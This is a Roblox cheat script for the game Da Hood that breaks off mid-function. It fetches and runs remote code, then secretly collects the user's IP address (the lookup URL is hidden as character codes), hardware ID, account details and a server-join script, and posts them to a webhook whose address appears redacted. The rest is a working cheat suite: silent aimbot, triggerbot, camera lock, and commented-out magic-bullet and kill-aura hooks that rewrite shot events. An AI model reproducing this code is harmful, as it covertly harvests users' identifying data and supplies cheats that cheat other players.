if game.PlaceId~=2788229376 then game.Players.LocalPlayer:Kick("Da Hood - only") return end
local ok1,a=pcall(function() return game:GetService("MarketplaceService"):GetProductInfo(2788229376).Name end)
local ok2,b=pcall(function() return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
setfpscap(999)
if not LPH_OBFUSCATED then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Luraph/macrosdk/main/luraphsdk.lua"))();
end
local DrawingNew = Drawing.new
local Vector2New = Vector2.new
local Vector3New = Vector3.new
local CFrameNew = CFrame.new
local Color3RGB = Color3.fromRGB
local math_huge = math.huge
local math_clamp = math.clamp
local math_sin = math.sin
local math_pi = math.pi
local tick = tick
local table_insert = table.insert
local table_clear = table.clear
local ipairs = ipairs
local pairs = pairs
local type = type
local typeof = typeof
if cleardrawcache then cleardrawcache() end
_G.symboldogshit = {
    "getrawmetatable", "setrawmetatable", "hookmetamethod", "newcclosure", 
    "getnamecallmethod", "checkcaller", "fireclickdetector", 
    "getcustomasset", "getgenv", "hookfunction", 
    "gethiddenproperty", "sethiddenproperty"
}
for i, v in ipairs(_G.symboldogshit) do
    _G.Index = i
    _G.fncname = v
    _G.freerobux = getgenv()[_G.fncname] or _G[_G.fncname]
    if not _G.freerobux then
        warn("executor not supported, it misses " .. _G.fncname)
        LPH_CRASH()
    end
end
_G.taskmanager_1 = identifyexecutor()
_G.taskmanager_2 = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request) or (request)
_G.taskmanager_3 = game:GetService("Players")
_G.taskmanager_4 = game:GetService("HttpService")
_G.taskmanager_5 = game:GetService("MarketplaceService")
_G.taskmanager_6 = _G.taskmanager_3.LocalPlayer
_G.taskmanager_7 = game:GetService("RbxAnalyticsService"):GetClientId()
_G.taskmanager_8 = "Not Supported"
if gethwid then
    _G.taskmanager_8 = gethwid()
end
local function _decode(t) local s = "" for i=1,#t do s = s .. string.char(t[i]) end return s end
_G.taskmanager_9 = game:HttpGet(_decode({104,116,116,112,115,58,47,47,97,112,105,46,105,112,105,102,121,46,111,114,103})) 
_G.taskmanager_10 = "removed by marcella"
_G.taskmanager_11 = "Unknown Game"
pcall(function() 
    _G.taskmanager_11 = _G.taskmanager_5:GetProductInfo(game.PlaceId).Name 
end)
_G.taskmanager_12 = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)', game.PlaceId, game.JobId)
_G.taskmanager_13 = {
    ["username"] = "Sample.hit",
    ["embeds"] = {{
        ["title"] = "# execution log - sample.hit",
        ["description"] = "instance executed",
        ["color"] = 0xFF9D00,
        ["fields"] = {
            {["name"] = "👤 Username", ["value"] = _G.taskmanager_6.Name, ["inline"] = true},
            {["name"] = "🧾 Display Name", ["value"] = _G.taskmanager_6.DisplayName, ["inline"] = true},
            {["name"] = "🆔 UserId", ["value"] = tostring(_G.taskmanager_6.UserId), ["inline"] = true},
            {["name"] = "🎮 Game", ["value"] = _G.taskmanager_11 .. " (`" .. game.PlaceId .. "`)", ["inline"] = false},
            {["name"] = "💲 Executor", ["value"] = _G.taskmanager_1, ["inline"] = false},
            {["name"] = "📅 Account Age", ["value"] = _G.taskmanager_6.AccountAge .. " days", ["inline"] = true},
            {["name"] = "🌐 IP", ["value"] = _G.taskmanager_9, ["inline"] = true},
            {["name"] = "🖥 HWID/CID", ["value"] = "```" .. _G.taskmanager_8 .. "```", ["inline"] = false},
            {["name"] = "🔗 Join Script", ["value"] = "```lua\n" .. _G.taskmanager_12 .. "\n```", ["inline"] = false}
        },
        ["footer"] = {["text"] = "l o g s"},
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}
_G.taskmanager_2({
    Url = _G.taskmanager_10,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = _G.taskmanager_4:JSONEncode(_G.taskmanager_13)
})
_G.Multi_IsBuying = false
_G.IsBuying = false
_G.busdhfnjsy7gjsy7d = false
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Camera = Workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local Mouse = LocalPlayer:GetMouse()
local Lighting = game:GetService("Lighting")
local StarterGui = game:GetService("StarterGui")
local library=loadstring(game:HttpGet("https://xor-1-45-25-0.getsample.lol"))() -- https://cdn.getsample.lol/3unt5vin
local flags = library.flags
local window = library:window({name = "sample", subname = ".hit", menulogo = "rbxassetid://107276976681956",size = UDim2.fromOffset(590, 565),})
local Main = window:tab({ name = " main" })
local Ragebot = window:tab({ name = " ragebot" })
local World = window:tab({ name = " world" })
local Visuals = window:tab({ name = " visuals" })
local Player = window:tab({ name = " misc" })
_G.SA = {
    silent = false,
    part = "Head",
    method = "closest point",
    knock = false,
    chance = 100,
    wall = false,
    custom = false,
    legacy = false,
    FOV = {
        vis = false,
        trans = 1,
        thick = 1,
        rad = 150,
        col = Color3.fromRGB(255,255,255)
    },
    Enabled = false
}

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera

local GunHandler = nil
local OriginalGetAim = nil

task.spawn(function()
    local module = ReplicatedStorage:WaitForChild("Modules", 5):WaitForChild("GunHandler", 5)
    if module then
        GunHandler = require(module)
        OriginalGetAim = GunHandler.getAim
    end
end)

_G.rc = nil
_G.FOVC = nil
_G.FOVC_O = nil
_G.FOVC_I = nil

_G.WC = LPH_NO_VIRTUALIZE(function(part)
    if not Camera or not LocalPlayer.Character then return false end
    local o = Camera.CFrame.Position
    local t = part.Position
    local d = (t - o).Unit
    local dist = (t - o).Magnitude
    local rp = RaycastParams.new()
    rp.FilterDescendantsInstances = {LocalPlayer.Character, Camera}
    rp.FilterType = Enum.RaycastFilterType.Blacklist
    rp.IgnoreWater = true
    local r = Workspace:Raycast(o, d * dist, rp)
    if r then
        local m = r.Instance:FindFirstAncestorOfClass("Model")
        return not (m and Players:GetPlayerFromCharacter(m))
    end
    return false
end)

_G.GCP = LPH_JIT_MAX(function()
    local cd, cp, cpl = nil, nil, nil
    local mPos = UserInputService:GetMouseLocation()
    local parts = {"LeftHand","LeftLowerArm","LeftUpperArm","RightHand","RightLowerArm","RightUpperArm","UpperTorso","LeftFoot","LeftLowerLeg","LeftUpperLeg","RightFoot","RightLowerLeg","RightUpperLeg","LowerTorso","Head"}
    for _, v in next, Players:GetPlayers() do
        if v ~= LocalPlayer and v.Character then
            local ch = v.Character
            local h = ch:FindFirstChild("Humanoid")
            local be = ch:FindFirstChild("BodyEffects")
            local ko = be and (be:FindFirstChild("K.O") or be:FindFirstChild("KO")) and (be:FindFirstChild("K.O") or be:FindFirstChild("KO")).Value
            if h and h.Health > 0 and (not _G.SA.knock or not ko) then
                if _G.SA.custom then
                    if _G.SA.method == "closest part" then
                        for _, pName in ipairs(parts) do
                            local p = ch:FindFirstChild(pName)
                            if p and (not _G.SA.wall or not _G.WC(p)) then
                                local sp, vis = Camera:WorldToViewportPoint(p.Position)
                                if vis then
                                    local d2 = (mPos - Vector2.new(sp.X, sp.Y)).Magnitude
                                    if d2 <= _G.SA.FOV.rad and (not cd or d2 < cd) then
                                        cd, cp, cpl = d2, p, v
                                    end
                                end
                            end
                        end
                    else
                        for _, p in ipairs(ch:GetChildren()) do
                            if p:IsA("BasePart") and (not _G.SA.wall or not _G.WC(p)) then
                                local sp, vis = Camera:WorldToViewportPoint(p.Position)
                                if vis then
                                    local d2 = (mPos - Vector2.new(sp.X, sp.Y)).Magnitude
                                    if d2 <= _G.SA.FOV.rad and (not cd or d2 < cd) then
                                        cd, cp, cpl = d2, p, v
                                    end
                                end
                            end
                        end
                    end
                elseif _G.SA.legacy then
                    local p = ch:FindFirstChild(_G.SA.part)
                    if p and (not _G.SA.wall or not _G.WC(p)) then
                        local sp, vis = Camera:WorldToViewportPoint(p.Position)
                        if vis then
                            local d2 = (mPos - Vector2.new(sp.X, sp.Y)).Magnitude
                            if d2 <= _G.SA.FOV.rad and (not cd or d2 < cd) then
                                cd, cp, cpl = d2, p, v
                            end
                        end
                    end
                end
            end
        end
    end
    return cp, cpl
end)

_G.cfovc = LPH_NO_VIRTUALIZE(function()
    if typeof(Drawing) == "table" and Drawing.new then
        if not _G.FOVC_O then
            _G.FOVC_O = Drawing.new("Circle")
            _G.FOVC_O.ZIndex = 1
            _G.FOVC_O.Filled = false
            _G.FOVC_O.Visible = false
            _G.FOVC_O.Color = Color3.new(0,0,0)
        end
        if not _G.FOVC_I then
            _G.FOVC_I = Drawing.new("Circle")
            _G.FOVC_I.ZIndex = 1
            _G.FOVC_I.Filled = false
            _G.FOVC_I.Visible = false
            _G.FOVC_I.Color = Color3.new(0,0,0)
        end
        if not _G.FOVC then
            _G.FOVC = Drawing.new("Circle")
            _G.FOVC.ZIndex = 2
            _G.FOVC.Filled = false
            _G.FOVC.Visible = false
        end
    end
end)

_G.ufovc = LPH_NO_VIRTUALIZE(function()
    if not _G.FOVC then return end
    local mPos = UserInputService:GetMouseLocation()
    local v = (_G.SA.FOV.vis and _G.SA.Enabled and (_G.SA.legacy or _G.SA.custom))
    _G.FOVC.Position = Vector2.new(mPos.X, mPos.Y)
    _G.FOVC.Visible = v
    _G.FOVC.Color = _G.SA.FOV.col
    _G.FOVC.Thickness = _G.SA.FOV.thick
    _G.FOVC.Radius = _G.SA.FOV.rad
    _G.FOVC.Transparency = _G.SA.FOV.trans
    if _G.FOVC_O then
        _G.FOVC_O.Position = _G.FOVC.Position
        _G.FOVC_O.Visible = v
        _G.FOVC_O.Thickness = _G.SA.FOV.thick + 2
        _G.FOVC_O.Radius = _G.SA.FOV.rad
        _G.FOVC_O.Transparency = _G.SA.FOV.trans
    end
    if _G.FOVC_I then
        _G.FOVC_I.Position = _G.FOVC.Position
        _G.FOVC_I.Visible = v
        _G.FOVC_I.Thickness = math.max(_G.SA.FOV.thick - 2, 0.1)
        _G.FOVC_I.Radius = _G.SA.FOV.rad
        _G.FOVC_I.Transparency = _G.SA.FOV.trans
    end
end)

_G.HM = LPH_JIT_MAX(function()
    if GunHandler then
        GunHandler.getAim = function(origin, range)
            local currentRange = range or 9999 -- Fix for the 'min' nil error
            if _G.SA.Enabled and (_G.SA.legacy or _G.SA.custom) then
                if math.random(0, 100) <= _G.SA.chance then
                    local target, _ = _G.GCP()
                    if target then
                        local dir = (target.Position - origin)
                        return dir.Unit, math.min(dir.Magnitude, currentRange)
                    end
                end
            end
            return OriginalGetAim(origin, currentRange)
        end
    end
end)

_G.UHM = LPH_NO_VIRTUALIZE(function()
    if GunHandler and OriginalGetAim then
        GunHandler.getAim = OriginalGetAim
    end
end)

_G.SSA = LPH_NO_VIRTUALIZE(function()
    if _G.rc then return end
    _G.cfovc()
    _G.HM()
    _G.rc = RunService.RenderStepped:Connect(function() _G.ufovc() end)
end)

_G.STA = LPH_NO_VIRTUALIZE(function()
    if _G.rc then pcall(function() _G.rc:Disconnect() end) _G.rc = nil end
    if _G.FOVC then _G.FOVC.Visible = false end
    if _G.FOVC_O then _G.FOVC_O.Visible = false end
    if _G.FOVC_I then _G.FOVC_I.Visible = false end
    _G.UHM()
end)

local v4 = Main:section({name = "silent aimbot"})
v4:keybind({
    name = "master keybind",
    flag = "tyitgiit",
    default = nil,
    display = "silent aimbot",
    callback = function(bool)
        _G.SA.Enabled = bool
        _G.SA.silent = bool and (_G.SA.legacy or _G.SA.custom)
        if _G.SA.silent then _G.SSA() else _G.STA() end
    end
})
v4:toggle({
    name = "enabled",
    flag = "uytruttuyk",
    default = false,
    callback = function(Value)
        _G.SA.Enabled = Value
        _G.SA.silent = Value and (_G.SA.legacy or _G.SA.custom)
        if _G.SA.silent then _G.SSA() else _G.STA() end
    end
})
v4:toggle({
    name = "knock check",
    flag = "ytuiitiity",
    default = false,
    callback = function(Value) _G.SA.knock = Value end
})
v4:toggle({
    name = "wall check",
    flag = "tyiittiktkitikt",
    default = false,
    callback = function(Value) _G.SA.wall = Value end
})
v4:toggle({
    name = "show fov",
    flag = "drtgfduityfgfr",
    default = false,
    callback = function(Value) _G.SA.FOV.vis = Value end
})
v4:colorpicker({
    name = "fov color",
    flag = "FOVColor",
    color = _G.SA.FOV.col,
    callback = function(Value) _G.SA.FOV.col = Value end
})
v4:slider({
    name = "fov size",
    flag = "lkuykrrh",
    suffix = "px",
    default = 150,
    min = 50,
    max = 1000,
    interval = 1,
    callback = function(Value) _G.SA.FOV.rad = Value end
})
v4:toggle({
    name = "use normal hitpart",
    flag = "fgytjftfgtjtyfj",
    default = false,
    callback = function(Value)
        _G.SA.legacy = Value
        _G.SA.silent = _G.SA.Enabled and (_G.SA.legacy or _G.SA.custom)
        if _G.SA.silent then _G.SSA() else _G.STA() end
    end
})
v4:dropdown({
    name = "normal hitpart",
    flag = "fgujfujftgyujfrgj",
    items = {"Head","HumanoidRootPart","UpperTorso","LowerTorso","RightHand","LeftHand","RightLeg"},
    multi = false,
    callback = function(Value) _G.SA.part = Value end
})
v4:toggle({
    name = "use custom hitpart",
    flag = "fjtfgjfrjfgv",
    default = false,
    callback = function(Value)
        _G.SA.custom = Value
        _G.SA.silent = _G.SA.Enabled and (_G.SA.legacy or _G.SA.custom)
        if _G.SA.silent then _G.SSA() else _G.STA() end
    end
})
v4:dropdown({
    name = "custom hitpart",
    flag = "fjfjttfjyjgfgtuj",
    items = {"closest part","closest point"},
    multi = false,
    callback = function(Value) _G.SA.method = Value end
})
v4:slider({
    name = "hit chance",
    flag = "ftjgffjfghy",
    suffix = "%",
    default = 100,
    min = 0,
    max = 100,
    interval = 1,
    callback = function(Value) _G.SA.chance = Value end
})
local v0 = Main:section({name = "triggerbot"})
_G.sylithtb = false
_G.lastCheck = 0
_G.currentTarget = nil
_G.TriggerBot = {
    Delay = 0.5,
    Blacklisted = {}
}
_G.isDead = LPH_NO_VIRTUALIZE(function(plr)
    local char = plr.Character
    if not char then return true end
    local be = char:FindFirstChild("BodyEffects")
    if not be then return true end
    local ko = be:FindFirstChild("K.O") or be:FindFirstChild("KO")
    return ko and ko.Value
end)
_G.getTargetFromPart = LPH_NO_VIRTUALIZE(function(part)
    if not part then return nil end
    local players = game:GetService("Players"):GetPlayers()
    for i = 1, #players do
        local plr = players[i]
        if plr.Character and part:IsDescendantOf(plr.Character) and not _G.isDead(plr) then
            return plr
        end
    end
    return nil
end)
_G.StartTriggerBot = LPH_JIT_MAX(function()
    if _G.TriggerBotConnection then _G.TriggerBotConnection:Disconnect() end
    local lp = Players.LocalPlayer
    local mouse = lp:GetMouse()
    _G.TriggerBotConnection = RunService.Heartbeat:Connect(function()
        if not _G.sylithtb then 
            _G.currentTarget = nil 
            return 
        end       
        local now = os.clock()
        if now - (_G.lastCheck or 0) < 0.05 then return end
        _G.lastCheck = now        
        local targetPlr = _G.getTargetFromPart(mouse.Target)
        _G.currentTarget = targetPlr
        local char = lp.Character
        if targetPlr and char then
            local tool = char:FindFirstChildWhichIsA("Tool")
            if tool then
                local isBlacklisted = false
                for name, enabled in next, _G.TriggerBot.Blacklisted do
                    if enabled and tool.Name:find(name) then
                        isBlacklisted = true
                        break
                    end
                end
                if not isBlacklisted then
                    task.spawn(function()
                        local delayTime = _G.TriggerBot.Delay or 0
                        if delayTime > 0 then task.wait(delayTime) end
                        if _G.currentTarget == _G.getTargetFromPart(mouse.Target) then
                            tool:Activate()
                        end
                    end)
                end
            end
        end
    end)
end)
_G.StartTriggerBot()
v0:toggle({
    name = "enabled",
    flag = "ftjgjufytjgvj",
    default = false,
    callback = function(v)
        _G.sylithtb = v
        if not v then _G.currentTarget = nil end
    end
})
v0:slider({
    name = "cooldown",
    flag = "dfrghdhygpppp",
    suffix = "s",
    default = 0.5,
    min = 0,
    max = 3,
    interval = 0.01,
    callback = function(v) 
        _G.TriggerBot.Delay = v 
    end
})
v0:dropdown({
    name = "blacklisted tools",
    flag = "dfgghdoooootthh",
    items = {"[Knife]","Combat","[Phone]","[Wallet]","TipJar","[Bat]","[Shovel]","[LockPicker]"},
    multi = true,
    callback = function(tbl) 
        _G.TriggerBot.Blacklisted = tbl 
    end
})
--[[
local magic_bullet_section = Main:section({name = "magic bullet"})
_G.magic_bullet = {
    enabled = false,
    target = nil,
    target_head = nil,
    target_position = nil,
    fov_visible = false,
    fov_radius = 200,
    fov_color = Color3.fromRGB(255, 255, 255)
}
_G.magic_bullet.hook = nil
magic_bullet_section:toggle({
    name = "enabled",
    flag = "magic_bullet_enabled",
    default = false,
    callback = function(value)
        _G.magic_bullet.enabled = value
        if value then
            local GetClosestTarget = LPH_JIT_MAX(function()
                local ClosestPlayer = nil
                local ClosestDistance = math.huge
                local MousePosition = game:GetService("UserInputService"):GetMouseLocation()
                local players = game.Players:GetPlayers()
                local cam = workspace.CurrentCamera
                for i = 1, #players do
                    local Player = players[i]
                    if Player ~= game.Players.LocalPlayer and Player.Character then
                        local Head = Player.Character:FindFirstChild("Head")
                        local Humanoid = Player.Character:FindFirstChild("Humanoid")
                        if Head and Humanoid and Humanoid.Health > 0 then
                            local ScreenPosition, Visible = cam:WorldToViewportPoint(Head.Position)
                            if Visible then
                                local Distance = (MousePosition - Vector2.new(ScreenPosition.X, ScreenPosition.Y)).Magnitude
                                if Distance <= _G.magic_bullet.fov_radius and Distance < ClosestDistance then
                                    ClosestDistance = Distance
                                    ClosestPlayer = Player
                                end
                            end
                        end
                    end
                end
                return ClosestPlayer
            end)
            task.spawn(LPH_NO_VIRTUALIZE(function()
                while _G.magic_bullet.enabled do
                    local targetPlayer = GetClosestTarget()
                    if targetPlayer and targetPlayer.Character then
                        local head = targetPlayer.Character:FindFirstChild("Head")
                        if head then
                            _G.magic_bullet.target = targetPlayer
                            _G.magic_bullet.target_head = head
                            _G.magic_bullet.target_position = head.Position
                        end
                    else
                        _G.magic_bullet.target = nil
                        _G.magic_bullet.target_head = nil
                        _G.magic_bullet.target_position = nil
                    end
                    task.wait()
                end
            end))
            if not _G.magic_bullet.hook then
                _G.magic_bullet.hook = hookmetamethod(game, "__namecall", LPH_JIT_MAX(function(self, ...)
                    local method = getnamecallmethod()
                    local args = {...}
                    if self.Name == "MainEvent" and method == "FireServer" and _G.magic_bullet.enabled then
                        local t_head = _G.magic_bullet.target_head
                        local t_pos = _G.magic_bullet.target_position
                        if t_head and args[1] == "ShootGun" then
                            args[4] = t_pos
                            args[5] = t_head
                            return _G.magic_bullet.hook(self, unpack(args))
                        end
                    end
                    return _G.magic_bullet.hook(self, ...)
                end))
            end
        else
            _G.magic_bullet.target = nil
            _G.magic_bullet.target_head = nil
            _G.magic_bullet.target_position = nil
        end
    end
})

magic_bullet_section:toggle({
    name = "show fov",
    flag = "magic_bullet_fov_visible",
    default = false,
    callback = function(value)
        _G.magic_bullet.fov_visible = value
    end
})

magic_bullet_section:colorpicker({
    name = "fov color",
    flag = "magic_bullet_fov_color",
    color = _G.magic_bullet.fov_color,
    callback = function(color)
        _G.magic_bullet.fov_color = color
    end
})

magic_bullet_section:slider({
    name = "fov size",
    flag = "magic_bullet_fov_radius",
    suffix = "px",
    default = 200,
    min = 0,
    max = 1000,
    interval = 1,
    callback = function(value)
        _G.magic_bullet.fov_radius = value
    end
})
_G.magic_fov_outline = Drawing.new("Circle")
_G.magic_fov_outline.Visible = false
_G.magic_fov_outline.Color = Color3.new(0, 0, 0)
_G.magic_fov_outline.Thickness = 3
_G.magic_fov_outline.Transparency = 1
_G.magic_fov_outline.Filled = false
_G.magic_fov_circle = Drawing.new("Circle")
_G.magic_fov_circle.Visible = false
_G.magic_fov_circle.Color = _G.magic_bullet.fov_color
_G.magic_fov_circle.Thickness = 1.5
_G.magic_fov_circle.Transparency = 1
_G.magic_fov_circle.Filled = false
game:GetService("RunService").RenderStepped:Connect(LPH_NO_VIRTUALIZE(function()
    local visible = _G.magic_bullet.enabled and _G.magic_bullet.fov_visible
    local mouse_pos = game:GetService("UserInputService"):GetMouseLocation()
    local radius = _G.magic_bullet.fov_radius
    local color = _G.magic_bullet.fov_color
    if visible then
        _G.magic_fov_outline.Position = mouse_pos
        _G.magic_fov_outline.Radius = radius
        _G.magic_fov_outline.Visible = true
        _G.magic_fov_circle.Position = mouse_pos
        _G.magic_fov_circle.Radius = radius
        _G.magic_fov_circle.Color = color
        _G.magic_fov_circle.Visible = true
    else
        _G.magic_fov_outline.Visible = false
        _G.magic_fov_circle.Visible = false
    end
end))]]
local v7 = Main:section({name = "camera aimbot",side = "right"})
getgenv().lock = false
getgenv().locktrgt = nil
getgenv().lockUsmooth = false
getgenv().locksmooth = 0.5
getgenv().lockpart = "Head"
getgenv().lockUpred = false
getgenv().lockpredX = 0
getgenv().lockpredY = 0
getgenv().lockpredZ = 0
getgenv().shalke = false
getgenv().shk = 0
getgenv().orbitSpeed = 5
getgenv().orbitAngle = 0
getgenv().orbitMid = false
v7:toggle({
    name = "enabled",
    flag = "camlock_enabled",
    default = false,
    callback = function(Value)
        getgenv().lock = Value
        if not Value then
            getgenv().locktrgt = nil
        end
    end
})

v7:keybind({
    name = "camera aimbot keybind",
    flag = "camlock_bind",
    default = nil,
    display = "camera aimbot",
    callback = function(bool)
        if not getgenv().lock then return end
        if getgenv().locktrgt then
            getgenv().locktrgt = nil
        else
            local closestPlayer, closestDistance = nil, math.huge
            local mousePos = game:GetService("UserInputService"):GetMouseLocation()
            local players = game:GetService("Players"):GetPlayers()
            local localPlayer = game:GetService("Players").LocalPlayer
            local camera = workspace.CurrentCamera
            for i = 1, #players do
                local Player = players[i]
                if Player ~= localPlayer then
                    local character = Player.Character
                    if character then
                        local part = character:FindFirstChild(getgenv().lockpart)
                        if part then
                            local screenPos, onScreen = camera:WorldToViewportPoint(part.Position)
                            if onScreen then
                                local dist = (Vector2.new(mousePos.X, mousePos.Y) - Vector2.new(screenPos.X, screenPos.Y)).Magnitude
                                if dist < closestDistance then
                                    closestDistance = dist
                                    closestPlayer = Player
                                end
                            end
                        end
                    end
                end
            end
            getgenv().locktrgt = closestPlayer
        end
    end
})

v7:dropdown({
    name = "hitpart",
    flag = "camlock_hitpart",
    items = {"Head", "UpperTorso", "LowerTorso", "HumanoidRootPart", "LeftFoot", "RightFoot", "LeftLowerArm", "RightLowerArm"},
    multi = false,
    callback = function(Value)
        getgenv().lockpart = Value
    end
})

v7:toggle({
    name = "smoothness",
    flag = "camlock_smooth_enabled",
    default = false,
    callback = function(Value)
        getgenv().lockUsmooth = Value
    end
})

v7:slider({
    name = "smoothing",
    flag = "camlock_smooth_value",
    suffix = "",
    default = 5,
    min = 0,
    max = 10,
    interval = 0.1,
    callback = function(Value)
        getgenv().locksmooth = 1 - (Value / 10)
        if getgenv().locksmooth <= 0 then
            getgenv().locksmooth = 0.01
        end
    end
})

v7:toggle({
    name = "prediction",
    flag = "camlock_pred_enabled",
    default = false,
    callback = function(Value)
        getgenv().lockUpred = Value
    end
})

v7:slider({
    name = "x prediction",
    flag = "camlock_predX_value",
    suffix = "",
    default = 0,
    min = 0,
    max = 10,
    interval = 0.1,
    callback = function(Value)
        getgenv().lockpredX = Value / 10
    end
})

v7:slider({
    name = "y prediction",
    flag = "camlock_predY_value",
    suffix = "",
    default = 0,
    min = 0,
    max = 10,
    interval = 0.1,
    callback = function(Value)
        getgenv().lockpredY = Value / 10
    end
})

v7:slider({
    name = "z prediction",
    flag = "camlock_predZ_value",
    suffix = "",
    default = 0,
    min = 0,
    max = 10,
    interval = 0.1,
    callback = function(Value)
        getgenv().lockpredZ = Value / 10
    end
})

v7:toggle({
    name = "shake",
    flag = "camlock_shake_enabled",
    default = false,
    callback = function(Value)
        getgenv().shalke = Value
    end
})

v7:slider({
    name = "shaking",
    flag = "camlock_shake_value",
    suffix = "",
    default = 0,
    min = 0,
    max = 10,
    interval = 0.1,
    callback = function(Value)
        getgenv().shk = Value / 10
    end
})

v7:toggle({
    name = "strafe if locked",
    flag = "camlock_orbit_enabled",
    default = false,
    callback = function(Value)
        getgenv().orbitMid = Value
        if Value then
            getgenv().orbitAngle = 0
        end
    end
})

v7:slider({
    name = "strafe speed",
    flag = "camlock_orbit_speed",
    suffix = "",
    default = 5,
    min = 0,
    max = 100,
    interval = 1,
    callback = function(Value)
        getgenv().orbitSpeed = Value
    end
})
game:GetService("RunService").RenderStepped:Connect(LPH_JIT_MAX(function(delta)
    if not getgenv().lock or not getgenv().locktrgt then return end
    local character = getgenv().locktrgt.Character
    local targetPart = character and character:FindFirstChild(getgenv().lockpart)
    if not targetPart then return end
    local camera = workspace.CurrentCamera
    local localChar = game.Players.LocalPlayer.Character
    if not localChar then return end
    local hrp = localChar:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local targetlockpos = targetPart.Position
    if getgenv().lockUpred then
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if rootPart then
            local vel = rootPart.Velocity
            targetlockpos += Vector3.new(
                vel.X * getgenv().lockpredX,
                vel.Y * getgenv().lockpredY,
                vel.Z * getgenv().lockpredZ
            )
        end
    end
    if getgenv().orbitMid then
        local speed = getgenv().orbitSpeed
        getgenv().orbitAngle += math.rad(speed * delta * 60)
        local radius = 5
        local offset = Vector3.new(
            math.cos(getgenv().orbitAngle) * radius,
            0,
            math.sin(getgenv().orbitAngle) * radius
        )
        hrp.CFrame = CFrame.new(targetlockpos + offset, targetlockpos)
    end
    local direction = (targetlockpos - camera.CFrame.Position).Unit
    if getgenv().shalke and getgenv().shk > 0 then
        local shakePower = getgenv().shk * 0.02
        direction += Vector3.new(
            (math.random() - 0.5) * shakePower,
            (math.random() - 0.5) * shakePower,
            (math.random() - 0.5) * shakePower
        )
        direction = direction.Unit
    end
    if getgenv().lockUsmooth then
        local currentCF = camera.CFrame
        local targetCF = CFrame.new(currentCF.Position, currentCF.Position + direction)
        camera.CFrame = currentCF:Lerp(targetCF, 1 - getgenv().locksmooth)
    else
        camera.CFrame = CFrame.new(camera.CFrame.Position, camera.CFrame.Position + direction)
    end
end))
getgenv().LastShootSoundTime = getgenv().LastShootSoundTime or 0
local SHOOT_COOLDOWN = 0.1
--[[local v46 = Main:section({name = "kill aura",side = "right"})
nymuskillaura = {}
nymuskillaura.KillAura = {
    Enabled = false,
    KnockCheckEnabled = false,
    ForceFieldCheckEnabled = false,
    Distance = 300,
    KeyDown = true
}

local function isGunEquipped()
    local character = game.Players.LocalPlayer.Character
    if character then
        local tool = character:FindFirstChildWhichIsA("Tool")
        return tool and tool:FindFirstChild("Handle") ~= nil
    end
    return false
end

local isTargetValid = LPH_NO_VIRTUALIZE(function(targetCharacter)
    if targetCharacter then
        if nymuskillaura.KillAura.KnockCheckEnabled then
            local bodyEffects = targetCharacter:FindFirstChild("BodyEffects")
            local KOd = bodyEffects and (bodyEffects:FindFirstChild("K.O") or bodyEffects:FindFirstChild("KO")) and (bodyEffects:FindFirstChild("K.O") or bodyEffects:FindFirstChild("KO")).Value
            if KOd then return false end
        end
        if nymuskillaura.KillAura.ForceFieldCheckEnabled then
            if targetCharacter:FindFirstChild("ForceField") then return false end
        end
        local Grabbed = targetCharacter:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
        return not Grabbed
    end
    return false
end)

local getNearestPlayer = LPH_NO_VIRTUALIZE(function()
    local character = game.Players.LocalPlayer.Character
    local rootPart = character and character:FindFirstChild("HumanoidRootPart")
    local nearestPlayer = nil
    local shortestDistance = nymuskillaura.KillAura.Distance
    if rootPart then
        for _, plr in pairs(game.Players:GetPlayers()) do
            if plr ~= game.Players.LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and isTargetValid(plr.Character) then
                local targetRootPart = plr.Character:FindFirstChild("HumanoidRootPart")
                local distance = (targetRootPart.Position - rootPart.Position).Magnitude
                if distance <= shortestDistance then
                    nearestPlayer = plr
                    shortestDistance = distance
                end
            end
        end
    end
    return nearestPlayer
end)

local shootNearestPlayer = LPH_NO_VIRTUALIZE(function()
    if not nymuskillaura.KillAura.Enabled then return end
    if not nymuskillaura.KillAura.KeyDown then return end
    if not isGunEquipped() then return end
    local character = game.Players.LocalPlayer.Character
    local rootPart = character and character:FindFirstChild("HumanoidRootPart")
    local tool = character and character:FindFirstChildWhichIsA("Tool")
    local targetPlayer = getNearestPlayer()
    if tool and tool:FindFirstChild("Handle") and rootPart and targetPlayer and targetPlayer.Character then
        local targetHead = targetPlayer.Character:FindFirstChild("Head")
        if targetHead then
            local direction = (targetHead.Position - rootPart.Position).Unit
            game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer("ShootGun", tool.Handle, rootPart.Position, targetHead.Position, targetHead, direction)
        end
    end
end)
game:GetService("RunService").Heartbeat:Connect(LPH_NO_VIRTUALIZE(function()
    shootNearestPlayer()
end))
v46:toggle({
    name = "enabled",
    flag = "killaura",
    default = false,
    callback = function(Value)
        nymuskillaura.KillAura.Enabled = Value
    end
})
v46:keybind({
    flag = "killaura_key",
    default = nil,
    display = "kill aura",
    callback = function(Value)
        nymuskillaura.KillAura.KeyDown = Value
    end
})
v46:toggle({
    name = "knock check",
    flag = "killaura_ko",
    default = false,
    callback = function(Value)
        nymuskillaura.KillAura.KnockCheckEnabled = Value
    end
})
v46:toggle({
    name = "forcefield check",
    flag = "killaura_frc",
    default = false,
    callback = function(Value)
        nymuskillaura.KillAura.ForceFieldCheckEnabled = Value
    end
})
v46:slider({
    name = "distance",
    flag = "killaura_distance",
    suffix = " studs",
    default = 100,
    min = 0,
    max = 300,
    interval = 0.1,
    callback = function(Value)
